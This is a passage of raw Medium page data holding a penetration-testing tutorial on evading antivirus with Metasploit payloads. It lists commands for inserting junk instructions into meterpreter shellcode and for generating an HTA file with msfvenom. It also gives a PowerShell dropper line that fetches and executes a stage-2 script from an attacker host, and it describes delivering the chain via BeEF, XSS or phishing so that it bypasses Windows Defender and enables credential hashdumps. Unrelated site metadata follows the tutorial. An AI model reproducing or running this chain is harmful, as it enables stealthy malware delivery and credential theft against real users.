string:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_41":{"id":"1ccbc183f8c7_41","__typename":"Paragraph","name":"a9a3","text":"cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o \".*\" | sed 's\u002F\"\u002F\u002Fg' \u003E raw_pshnet_revhttps.base64.txt","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":114,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_42":{"id":"1ccbc183f8c7_42","__typename":"Paragraph","name":"9c09","text":"Transform in hex string:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_43":{"id":"1ccbc183f8c7_43","__typename":"Paragraph","name":"33d6","text":"base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d '\\n' \u003E raw_pshnet_revhttps.hex.txt","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":92,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_44":{"id":"1ccbc183f8c7_44","__typename":"Paragraph","name":"5592","text":"Next, paste your hexadecimal string into disassembler. We will use online disassembler https:\u002F\u002Fdefuse.ca\u002Fonline-x86-assembler.htm for demo purpose. Do not forget to put the correct architecture. Here we have a x64 payload. Note that since some changes to PowerShell, you cannot make 32b shellcode work with 64b PowerShell process, you must use x64 shellcode.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":87,"end":129,"type":"A","href":"https:\u002F\u002Fdefuse.ca\u002Fonline-x86-assembler.htm","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_45":{"id":"1ccbc183f8c7_45","__typename":"Paragraph","name":"5ded","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*D-QNiDSoAuHf_38WcmooPQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_46":{"id":"1ccbc183f8c7_46","__typename":"Paragraph","name":"2444","text":"You see the first disassembled instructions:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_47":{"id":"1ccbc183f8c7_47","__typename":"Paragraph","name":"7981","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*2knW8_1LnPW3A6b2ucGMAA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_48":{"id":"1ccbc183f8c7_48","__typename":"Paragraph","name":"50eb","text":"We want to put junk instructions at the beginning of the assembly code. Be careful, if you put instructions after the call to cld, the shellcode will be broken, since string operations will have impact on index registers (esi and edi).","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_49":{"id":"1ccbc183f8c7_49","__typename":"Paragraph","name":"ec62","text":"You can add some instructions such as xor, inc, dec, add, sub, mov, nop etc. at the beginning. There are many ways to add instructions, but you could just use assembler on defuse.ca to assemble your instructions and then put it back in shellcode.\nBelow is an example of instructions we added:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_50":{"id":"1ccbc183f8c7_50","__typename":"Paragraph","name":"2e00","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*d0FSro3l_iGs5P4AVpAx3w.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_51":{"id":"1ccbc183f8c7_51","__typename":"Paragraph","name":"efa6","text":"Do not add too much nop in succession, because it could be flagged as suspicious. Here we modified the rax register because it is not used at the beginning.\nOf course, the same operation can be done at different places in the shellcode.\nOnce you have your shellcode ready, you can paste it in a file and convert it to base64.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_52":{"id":"1ccbc183f8c7_52","__typename":"Paragraph","name":"4b82","text":"xxd -p -r final_pshnet_revhttps.hex.txt | base64 | tr -d '\\n' \u003E final_pshnet_revhttps.base64.txt","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":96,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_53":{"id":"1ccbc183f8c7_53","__typename":"Paragraph","name":"965f","text":"Finally, you can put it back into the PS file.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_54":{"id":"1ccbc183f8c7_54","__typename":"Paragraph","name":"1732","text":"Preparing HTA file","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_55":{"id":"1ccbc183f8c7_55","__typename":"Paragraph","name":"8cbb","text":"So now that we have shellcode and PowerShell template ready, we need to prepare the HTA file that will execute our dropper.\nMSF can generate an HTA file with the following command:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_56":{"id":"1ccbc183f8c7_56","__typename":"Paragraph","name":"7f07","text":"msfvenom -p windows\u002Fx64\u002Fmeterpreter_reverse_https LHOST=X.X.X.X LPORT=443 -f hta-psh -o msf_hta.hta","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":99,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_57":{"id":"1ccbc183f8c7_57","__typename":"Paragraph","name":"d66c","text":"Here the payload is stageless reverse HTTPS, but we do not care about generated payload since we will use HTA to call our own PowerShell payload. It will generate a file with embedded VBScript that will call PowerShell with an encoded command, which performs loading of shellcode in memory.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_58":{"id":"1ccbc183f8c7_58","__typename":"Paragraph","name":"c191","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*88OwIEd22DOn7aOrOIbBrw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_59":{"id":"1ccbc183f8c7_59","__typename":"Paragraph","name":"03a3","text":"We will decode the original payload and adapt it to execute our own PowerShell payload. Put it in a file and we are going to decode it:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_60":{"id":"1ccbc183f8c7_60","__typename":"Paragraph","name":"6ef3","text":"cat base64_hta_payload.txt | base64 -d \u003E decoded_hta_payload.txt","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":64,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_61":{"id":"1ccbc183f8c7_61","__typename":"Paragraph","name":"e03d","text":"Result should look like this:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_62":{"id":"1ccbc183f8c7_62","__typename":"Paragraph","name":"5b2e","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RNG83UHMdhHWIpum0K32pQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_63":{"id":"1ccbc183f8c7_63","__typename":"Paragraph","name":"4f70","text":"What we want to do here is remove the loading of the base64 shellcode and instead perform a web request to execute our PowerShell stage 2 payload that is hosted on our web server.\nWe also have to take into account proxy before doing the request.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_64":{"id":"1ccbc183f8c7_64","__typename":"Paragraph","name":"de1f","text":"In PowerShell, this would give something like this:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_65":{"id":"1ccbc183f8c7_65","__typename":"Paragraph","name":"0042","text":"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR http:\u002F\u002FX.X.X.X\u002Fstage2.ps1 -UserAgent ‘Mozilla\u002F5.0 (Windows NT 10.0; WOW64; Trident\u002F7.0; rv:11.0) like Gecko’|IEX","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":199,"end":224,"type":"A","href":"http:\u002F\u002FX.X.X.X\u002Fstage2.ps1","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_66":{"id":"1ccbc183f8c7_66","__typename":"Paragraph","name":"bf89","text":"Here we set the User-Agent so that our web server would serve the correct payload (matching on “Windows” User-Agent).\nThen you need to convert your modified dropper in base64 UTF-16LE and put it back in HTA file:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_67":{"id":"1ccbc183f8c7_67","__typename":"Paragraph","name":"8234","text":"cat decoded_hta_payload.txt | iconv -f ascii -t utf-16le | base64 | tr -d '\\n' \u003E hta_payload.base64.txt","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":103,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_68":{"id":"1ccbc183f8c7_68","__typename":"Paragraph","name":"06a0","text":"The result looks like this:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_69":{"id":"1ccbc183f8c7_69","__typename":"Paragraph","name":"64c1","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*pxCoeAUjskIjwOT8d20cdA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_70":{"id":"1ccbc183f8c7_70","__typename":"Paragraph","name":"5cfa","text":"Finally, we have our exploit chain ready.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_71":{"id":"1ccbc183f8c7_71","__typename":"Paragraph","name":"278b","text":"Launching the attack","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_72":{"id":"1ccbc183f8c7_72","__typename":"Paragraph","name":"997a","text":"Time to test! The victim is a Windows 10 Pro version 1909 (OS Build 18363.600) with all protections enabled.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_73":{"id":"1ccbc183f8c7_73","__typename":"Paragraph","name":"be43","text":"We simulate browser hooking with BeEF by browsing to a page containing BeEF hook script. In real life, this can be done through XSS exploitation, phishing campaign… Our Internet Explorer browser is hooked:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_74":{"id":"1ccbc183f8c7_74","__typename":"Paragraph","name":"14dd","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*O2sXEUnHTrdyvRWUDAp9yw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_75":{"id":"1ccbc183f8c7_75","__typename":"Paragraph","name":"92a2","text":"From here, we can go to the HTA PowerShell module and launch it. We rewrite the serving domain and HTA handler to serve our custom payload:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_76":{"id":"1ccbc183f8c7_76","__typename":"Paragraph","name":"45be","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*8AN3L94KVm9TQMfhQzCGKg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_77":{"id":"1ccbc183f8c7_77","__typename":"Paragraph","name":"35b5","text":"HTA is delivered to our victim:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_78":{"id":"1ccbc183f8c7_78","__typename":"Paragraph","name":"6ce0","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*auQi-RP3-YApCEhgBoNnqA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_79":{"id":"1ccbc183f8c7_79","__typename":"Paragraph","name":"a094","text":"Once the victim clicks on open, it will download PowerShell dropper (stage 2) and execute it. The latter will then inject full meterpreter shellcode inside memory (since it’s stageless), so we won’t be catched when trying to load meterpreter modules.\nAll of this is of course hidden from the victim, and we get our meterpreter session a few seconds after click. Meterpreter is fully working and not catched by anti-virus solution (in this case, we tested with up-to-date Windows Defender).","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_80":{"id":"1ccbc183f8c7_80","__typename":"Paragraph","name":"121a","text":"Conclusion","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_81":{"id":"1ccbc183f8c7_81","__typename":"Paragraph","name":"ee5a","text":"The method showcased here is quite simple and does not take a lot of efforts, which meets penetration testing requirements where you usually do not have a lot of time to prepare things or build fancy tools. Note that the technique that has been shown here to bypass AV is just one of the many ways that could be used in order to do so. \nActually, we could go even further (and we are planning to) by automating shellcode changes. Then, we would have full automated MSF payload modification. You could encounter other defenses such as AppLocker, which we do not talk about here, that will render that kind of approach useless since PowerShell will not be at our disposal anymore. This could become the subject of another post in the future, depending on the feedback we will get.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_82":{"id":"1ccbc183f8c7_82","__typename":"Paragraph","name":"088b","text":"Funny side note","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_83":{"id":"1ccbc183f8c7_83","__typename":"Paragraph","name":"7712","text":"After uploading our payload to VirusTotal, we got a connection back to our meterpreter listener from a third-party IP address. Our assumption is that it was THOR APT Scanner, which creates Yara rules from almost everything uploaded to VirusTotal (including PowerShell scripts without shellcode) but do not fall in the OST debate :P.\nBelow is a screenshot of hashdump command we managed to run:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_84":{"id":"1ccbc183f8c7_84","__typename":"Paragraph","name":"697d","text":"Requests going through our nginx","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*wvX3asWI8PL2ZRRnZpEbjA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_85":{"id":"1ccbc183f8c7_85","__typename":"Paragraph","name":"920d","text":"Hashdump on remote machine","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XxzJZmJH2SAB5FH5DraL3w.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_86":{"id":"1ccbc183f8c7_86","__typename":"Paragraph","name":"926c","text":"References","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_87":{"id":"1ccbc183f8c7_87","__typename":"Paragraph","name":"ac2a","text":"@kmkz_security @darksh3llRU @bluedenkare","type":"OLI","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_88":{"id":"1ccbc183f8c7_88","__typename":"Paragraph","name":"d682","text":"https:\u002F\u002Fraw.githubusercontent.com\u002Fdarksh3llRU\u002Ftools\u002Fmaster\u002Fpsh-net_shellcode_fastchange.sh","type":"OLI","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":90,"type":"A","href":"https:\u002F\u002Fraw.githubusercontent.com\u002Fdarksh3llRU\u002Ftools\u002Fmaster\u002Fpsh-net_shellcode_fastchange.sh","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_89":{"id":"1ccbc183f8c7_89","__typename":"Paragraph","name":"5995","text":"https:\u002F\u002Fgithub.com\u002Fkmkz\u002FPentesting\u002FAV_Evasion","type":"OLI","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":45,"type":"A","href":"https:\u002F\u002Fgithub.com\u002Fkmkz\u002FPentesting\u002Ftree\u002Fmaster\u002FAV_Evasion","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"ImageMetadata:1*aOmoaGSOix6EwdG0zKIIwg.png":{"id":"1*aOmoaGSOix6EwdG0zKIIwg.png","__typename":"ImageMetadata","originalHeight":512,"originalWidth":482,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*caaKvyFWcMkbxh2tbRu3DA.png":{"id":"1*caaKvyFWcMkbxh2tbRu3DA.png","__typename":"ImageMetadata","originalHeight":134,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*IGSRHSxerw3A1RZ0cRkzrg.png":{"id":"1*IGSRHSxerw3A1RZ0cRkzrg.png","__typename":"ImageMetadata","originalHeight":351,"originalWidth":665,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*9kRSNg0IsaFXByGL9-DMeg.png":{"id":"1*9kRSNg0IsaFXByGL9-DMeg.png","__typename":"ImageMetadata","originalHeight":406,"originalWidth":634,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*D-QNiDSoAuHf_38WcmooPQ.png":{"id":"1*D-QNiDSoAuHf_38WcmooPQ.png","__typename":"ImageMetadata","originalHeight":314,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*2knW8_1LnPW3A6b2ucGMAA.png":{"id":"1*2knW8_1LnPW3A6b2ucGMAA.png","__typename":"ImageMetadata","originalHeight":457,"originalWidth":438,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*d0FSro3l_iGs5P4AVpAx3w.png":{"id":"1*d0FSro3l_iGs5P4AVpAx3w.png","__typename":"ImageMetadata","originalHeight":374,"originalWidth":444,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*88OwIEd22DOn7aOrOIbBrw.png":{"id":"1*88OwIEd22DOn7aOrOIbBrw.png","__typename":"ImageMetadata","originalHeight":264,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*RNG83UHMdhHWIpum0K32pQ.png":{"id":"1*RNG83UHMdhHWIpum0K32pQ.png","__typename":"ImageMetadata","originalHeight":389,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*pxCoeAUjskIjwOT8d20cdA.png":{"id":"1*pxCoeAUjskIjwOT8d20cdA.png","__typename":"ImageMetadata","originalHeight":111,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*O2sXEUnHTrdyvRWUDAp9yw.png":{"id":"1*O2sXEUnHTrdyvRWUDAp9yw.png","__typename":"ImageMetadata","originalHeight":278,"originalWidth":640,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*8AN3L94KVm9TQMfhQzCGKg.png":{"id":"1*8AN3L94KVm9TQMfhQzCGKg.png","__typename":"ImageMetadata","originalHeight":258,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*auQi-RP3-YApCEhgBoNnqA.png":{"id":"1*auQi-RP3-YApCEhgBoNnqA.png","__typename":"ImageMetadata","originalHeight":334,"originalWidth":640,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*wvX3asWI8PL2ZRRnZpEbjA.png":{"id":"1*wvX3asWI8PL2ZRRnZpEbjA.png","__typename":"ImageMetadata","originalHeight":58,"originalWidth":660,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*XxzJZmJH2SAB5FH5DraL3w.png":{"id":"1*XxzJZmJH2SAB5FH5DraL3w.png","__typename":"ImageMetadata","originalHeight":234,"originalWidth":624,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:0*CLa90L4u5myp76-B":{"id":"0*CLa90L4u5myp76-B","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:a59ccfe461d2":{"id":"a59ccfe461d2","__typename":"Collection","name":"Agoric","slug":"agoric","domain":null},"User:4433b0abf62f":{"id":"4433b0abf62f","__typename":"User","name":"Kate Sills","username":"katesills","bio":"\"a bizarre mish-mash of hippie anarchism and economic liberalism beefed up with lots of technological determinism\" -- Software Engineer at @agoric","isFollowing":null,"imageId":"1*Y_90Lh7Hrl952JMZ71HkSQ.jpeg","mediumMemberAt":0,"hasDomain":false},"Post:3899bf837f23":{"id":"3899bf837f23","__typename":"Post","title":"Preventing Reentrancy Attacks in Smart Contracts","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fagoric\u002Fpreventing-reentrancy-attacks-in-smart-contracts-3899bf837f23","previewImage":{"__ref":"ImageMetadata:0*CLa90L4u5myp76-B"},"isPublished":true,"firstPublishedAt":1548684060822,"readingTime":7.15377358490566,"statusForCollection":"APPROVED","isLocked":false,"isShortform":false,"visibility":"PUBLIC","collection":{"__ref":"Collection:a59ccfe461d2"},"creator":{"__ref":"User:4433b0abf62f"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*Jtp4mELJnNBYDMwGP90HSw.jpeg":{"id":"1*Jtp4mELJnNBYDMwGP90HSw.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:f41f22e4979f":{"id":"f41f22e4979f","__typename":"Collection","name":"Enrique Dans","slug":"enrique-dans","domain":null},"User:acfc0d77aeef":{"id":"acfc0d77aeef","__typename":"User","name":"Enrique Dans","username":"edans","bio":"Professor of Innovation at IE Business School and blogger at enriquedans.com","isFollowing":null,"imageId":"2*rYxmtnMlMLrGyIc30itIvw.jpeg","mediumMemberAt":1490606895000,"hasDomain":false},"Post:39e1ecd85d37":{"id":"39e1ecd85d37","__typename":"Post","title":"Do we need to recognize that we have a facial recognition problem?","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fenrique-dans\u002Fdo-we-need-to-recognize-that-we-have-a-facial-recognition-problem-39e1ecd85d37","previewImage":{"__ref":"ImageMetadata:1*Jtp4mELJnNBYDMwGP90HSw.jpeg"},"isPublished":true,"firstPublishedAt":1562228808088,"readingTime":1.879245283018868,"statusForCollection":"APPROVED","isLocked":true,"isShortform":false,"visibility":"LOCKED","collection":{"__ref":"Collection:f41f22e4979f"},"creator":{"__ref":"User:acfc0d77aeef"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg":{"id":"1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:962fb1c4c47e":{"id":"962fb1c4c47e","__typename":"Collection","name":"Bloomberg","slug":"bloomberg","domain":null},"User:3d76181076e6":{"id":"3d76181076e6","__typename":"User","name":"Bloomberg","username":"bloomberg","bio":"Find more like this at bloomberg.com","isFollowing":null,"imageId":"1*aFLLGsE20mi1mOuO8HH9ug.jpeg","mediumMemberAt":0,"hasDomain":false},"Post:1d248414e041":{"id":"1d248414e041","__typename":"Post","title":"Hackers Have Infiltrated Many of Washington State’s Agencies","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fbloomberg\u002Fhackers-have-infiltrated-many-of-washington-states-agencies-1d248414e041","previewImage":{"__ref":"ImageMetadata:1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg"},"isPublished":true,"firstPublishedAt":1601301600000,"readingTime":4.29433962264151,"statusForCollection":"APPROVED","isLocked":true,"isShortform":false,"visibility":"LOCKED","collection":{"__ref":"Collection:962fb1c4c47e"},"creator":{"__ref":"User:3d76181076e6"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*sZamlaesGrM5m4Arr7_FNw.jpeg":{"id":"1*sZamlaesGrM5m4Arr7_FNw.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"User:e680fcaf274b":{"id":"e680fcaf274b","__typename":"User","name":"Prof Bill Buchanan OBE","username":"billatnapier","bio":"Professor of Cryptography. Serial innovator. Believer in fairness, justice & freedom. EU Citizen. Auld Reekie native. Old World Breaker. New World Creator.","isFollowing":null,"imageId":"1*H2rG3QLPlapx0qVdkPX8iA.jpeg","mediumMemberAt":1533886719000,"hasDomain":false},"Post:1eb053edd9c":{"id":"1eb053edd9c","__typename":"Post","title":"For The Love of Ciphers: Four-square","mediumUrl":"https:\u002F\u002Fmedium.com\u002F@billatnapier\u002Ffor-the-love-of-ciphers-four-square-1eb053edd9c","previewImage":{"__ref":"ImageMetadata:1*sZamlaesGrM5m4Arr7_FNw.jpeg"},"isPublished":true,"firstPublishedAt":1562827111876,"readingTime":6.259433962264151,"statusForCollection":null,"isLocked":true,"isShortform":false,"visibility":"LOCKED","collection":null,"creator":{"__ref":"User:e680fcaf274b"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*AsZyrb143dw9sbnqyod_8g.png":{"id":"1*AsZyrb143dw9sbnqyod_8g.png","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:f5af2b715248":{"id":"f5af2b715248","__typename":"Collection","name":"The Startup","slug":"swlh","domain":null},"User:dd190d205cab":{"id":"dd190d205cab","__typename":"User","name":"Victor Zhou","username":"victorczhou","bio":"CS @ Princeton University. I write about web development, machine learning, and more at https:\u002F\u002Fvictorzhou.com.","isFollowing":null,"imageId":"1*UFkZ6xqWWTW1UWHKZwfxHQ.png","mediumMemberAt":0,"hasDomain":false},"Post:1dc03148d261":{"id":"1dc03148d261","__typename":"Post","title":"Sendy is Insecure: How Not to Implement reCAPTCHA","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fswlh\u002Fsendy-is-insecure-how-not-to-implement-recaptcha-1dc03148d261","previewImage":{"__ref":"ImageMetadata:1*AsZyrb143dw9sbnqyod_8g.png"},"isPublished":true,"firstPublishedAt":1574038550281,"readingTime":4.088050314465409,"statusForCollection":"APPROVED","isLocked":true,"isShortform":false,"visibility":"LOCKED","collection":{"__ref":"Collection:f5af2b715248"},"creator":{"__ref":"User:dd190d205cab"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:":{"id":"","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:dee6a258ab11":{"id":"dee6a258ab11","__typename":"Collection","name":"Becoming a 